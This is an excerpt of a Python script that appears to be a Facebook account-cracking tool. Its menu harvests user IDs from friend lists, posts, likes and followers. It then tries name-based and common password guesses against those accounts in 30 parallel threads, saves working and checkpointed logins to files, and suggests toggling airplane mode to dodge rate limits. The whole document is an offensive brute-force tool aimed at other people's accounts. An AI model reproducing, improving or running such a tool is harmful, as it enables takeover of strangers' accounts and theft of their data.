...
ct = datetime.now()
n = ct.month
bulan_ = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agust', 'September', 'October', 'November', 'December']
try:
	if n < 0 or n > 12:
		exit()
	nTemp = n - 1
...
bulan12 = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Agust", "09": "September", "10": "October", "11": "November", "12": "December"}
...
_________________________________________________________
 ...
 [\x1b[1;96m+%s] AUTHOR    : +++•LTKYAW•+++

 [\x1b[1;96m+%s] COUNTRY   :  👽 MYANMAR 👽

 [\x1b[1;95m+%s] CONTACT   : 💥 m.me/arakanese.003 💥 [•MMRV5•]
_________________________________________________________\n'''%(O,M,K,H))
	...
	def __login__(self):
		...
		if token in ['']:
			...
			try:
				...
				print('\n [%s+%s] LOGIN DONE %s'%(O,B,cc))
				self.bot()
			except KeyError:
				jalan(' [%s!%s] LEE TOKEN 😩 (Change Nauk 1 Ku)!'%(M,B))
				self.takon()
	def takon(self):
		takon = input('\n %s[%s!%s] How to know, Get Token Y/t: '%(N,O,N))
		if takon in ['y','Y','iya']:
			jalan('\n %s[%s!%s] MAKE GOOD USE OF YOUR BRAIN 😜'%(N,O,N))
			os.system('xdg-open wa.me/959424801498');exit()
		else:
			login().__login__()
	def bot(self):
...
class menu:
	...
	def main(self):
		...
		try:
			...
			print(' [%s+%s] YOU ARE NOT LOGIN'%(M,N));login().__login__()
		try:
		...
		jalan(' %s[ %s<<< WELCOME >>>%s%s ]'%(M,H,K,B))
		print(' %s[%s•%s] IP ADDRESS : %s'%(N,O,N,IP))
		print(' %s[%s•%s] YOUR LOGIN  : %s'%(H,O,H,waktu))
		print(' %s'%(M))
		print(' %s[%s0%s] CRACK FROM FRIEND LIST'%(M,O,M))
		print(' %s[%s1%s] CRACK FROM PUBLIC ID'%(M,O,M))
		print(' %s[%s2%s] CRACK FROM ID BULK [error]'%(M,O,M))
		print(' %s[%s3%s] CRACK FROM POST'%(M,O,M))
		print(' %s[%s4%s] CRACK FROM LIKE POST'%(M,O,M))
		print(' %s[%s5%s] CRACK FROM FOLLOWER'%(M,O,M))
		print(' %s[%s6%s] \033[1;31mCHECK OPTION CP ACCOUNT'%(N,O,N))
		print(' %s[%s7%s] \033[1;31mCHECK CRACK RESULT OK/CP'%(N,O,N))
		print(' %s[%s8%s] \033[1;31mSETTING USER-AGENT'%(N,O,N))
		print(' %s[%s9%s] \033[1;31mCRACK EMAIL'%(N,O,N))
		print(' %s[%sA%s] \033[1;31mGET DATA² FACEBOOK'%(N,O,N))
		print(' %s[%sB%s] \033[1;31mREPORT BUG SCRIPT'%(N,O,N))
		print(' %s[%sC%s] \033[1;31mLOGOUT & DELETE TOKEN'%(N,O,N))
		self.pilih()
	...
	def pilih(self):
		...
		if usna in ['']:
			...
			try:
				...
				exit(' %s[%s!%s] CHECK YOUR TOKEN'%(N,M,N))
			try:
				...
				print(' %s[%s!%s] YOUR ID NOT PUBLIC...'%(N,M,N));time.sleep(2);menu().main()
			else:
				crack().fbeh(id)
		elif usna in ['1','01']:
			try:
			...
			print(' %s'%(N))
			print(' %s[%s•%s] INPUT -> CP.txt FILE'%(N,O,N))
			files = input(' %s[%s•%s] INPUT FILE : '%(N,O,N))
			try:
				buka_baju = open(files, "r").readlines()
			except IOError:
				exit("\n%s [%s!%s] NO HAVE %s%s%s FILE!"%(N,M,N,H,files,N))
			...
			if hsl in ['1','01']:
				...
				if len(hasil_ok) != 0:
					...
					print(' %s [%s!%s] YOU NOT GET RESULTS OK :('%(N,O,N))
			elif hsl in ['2','02']:
				hasil_cp = open('Cp.txt','r').read()
				if len(hasil_cp) != 0:
					print('\n')
					print(' %s[ %sYOUR RESULT %s]'%(N,K,N))
					os.system('cat Cp.txt');exit()
			else:
				menu().main()
		elif usna in ['8','08']:
			print(' %s '%(N))
			print(' %s [%s1%s] CHECK DEFAULT USER AGENT'%(N,O,N))
			...
			if pwk in ['1','01']:
				...
				ua = input(' %s [%s+%s] INPUT NEW : '%(N,O,N))
				try:
			...
			exit('%s [%s!%s] Crack is complete'%(N,O,N))
		elif usna in ['G','g']:
			target()
		elif usna in ['K','k']:
			nom_wa ='+959424801498'
			...
			nom_wa ='+959424801498'
			kata = input(' %s [%s!%s] Enter your message to admin : %s'%(N,O,N,H))
			url_wa = ("https://api.whatsapp.com/+959424801498?phone="+nom_wa+"&text="+kata)
			subprocess.check_output(["am", "start", url_wa])
			exit()
		else:
...
def khamdihi(user, pasw):
	...
	if "c_user" in ses.cookies:
		...
		print(" • Accounts That May Be Associated With Facebook : %s"%(str(len(xe))))
		num = 0
		for _ in xe:
			num += 1
		...
		print(" • Total Option Available  "+str(len(ngew)))
...
class crack:
	...
	def fbeh(self,id):
		...
		if kham in ['']:
			print(' %s[%s!%s] Dont blank !'%(N,M,N));time.sleep(2);crack().fbeh(id)
			...
			while True:
				...
				if pw in ['']:
					...
					def manual(xnxx=None):
						...
						if mani in ['']:
							print(' %s [%s!%s] Dont blank cow'%(N,M,N));self.manual()
						elif mani in ['1','01']:
							print(' %s '%(N))
							...
							print(' %s [%s*%s] CP/ACCOUNT WILL BE SAVE IN FILE : CP.txt\n'%(N,O,N))
							with khamdihiXD(max_workers=30) as dihi:
								for me in self.id:
									try:
										Nufikha = me.split('<=>')[0]
			...
			print(' %s[%s1%s] METHOD FREE'%(N,O,N))
			print(' %s[%s2%s] METHOD MBASIC'%(N,O,N))
			print(' %s[%s3%s] METHOD MOBILE/(Recommended)'%(N,O,N))
			self.otomatis()
	def otomatis(self):
		print(' %s '%(N))
		oto = input(' %s[%s+%s] CRACK WITH METHOD : '%(N,O,N))
		if oto in ['']:
			print(' [%s!%s] dont blank'%(O,N));self.otomatis()
		elif oto in ['1','01']:
			self.free()
		elif oto in ['2','02']:
			self.basic()
			...
			print(' [%s!%s] Choose the right menu dog'%(M,N));self.otomatis()
	def free(self):
		print(' %s '%(N))
		print(' %s [%s*%s] OK/ACC WILL BE SAVE IN FILE : result/ok.txt'%(N,O,N))
		print(' %s [%s*%s] CP/ACC WILL BE SAVE IN FILE : result/cp.txt\n'%(N,O,N))
		with khamdihiXD(max_workers=30) as dihi:
			for me in self.id:
				try:
					uid, name = me.split('<=>')
	...
	def basic(self):
		print(' %s '%(N))
		print(' %s[%s*%s] OK/ACC WILL BE SAVE IN FILE : OK.txt'%(N,O,N))
		print(' %s[%s*%s] CP/ACC WILL BE SAVE IN FILE : CP.txt'%(N,O,N))
		print(' %s[%s!%s] Airplane mode 3 seconds if no result\n'%(N,O,N))
		with khamdihiXD(max_workers=30) as dihi:
			for me in self.id:
				try:
					uid, name = me.split('<=>')
		...
		with khamdihiXD(max_workers=30) as dihi:
			for nama in self.id:
				try:
					...
					nun = gas[0]
					if len(nun)>=6:
						pwx = ['123456','loveyou','mylover','ltkyaw','fuckyou','leelee','password','minmsp']
					elif len(nun)<=1:
						pwx = [nun, nun+'123', nun+'321', nun+'1234', nun+'12345', name]
					elif len(nun)<=2:
						pwx = [nun, nun+'123', nun+'321', nun+'1234', nun+'12345', name]
	...
	def b_api(self,user,pwx): # Kamu jahat :v
		...
		sys.stdout.write('\r %s* %s[%s👽CRACK👽%s] %s/%s [OK:%s - CP:%s] %s*'%(eram,N,O,N,loop,len(self.id),len(ok),len(cp),nufi));sys.stdout.flush() # Lo kontol...
		try:
			for pw in pwx:
				pw = pw.lower()
				ses = requests.Session()
	...
	def mbasic(self,user,pwx):
		...
		sys.stdout.write('\r %s*%s[%s👽CRACK👽%s] %s/%s [OK:%s CP:%s]%s* '%(asw,N,H,N,loop,len(self.id),len(ok),len(cp),mmk));sys.stdout.flush()
		try:
			for pw in pwx:
				pw = pw.lower()
				ses = requests.Session()
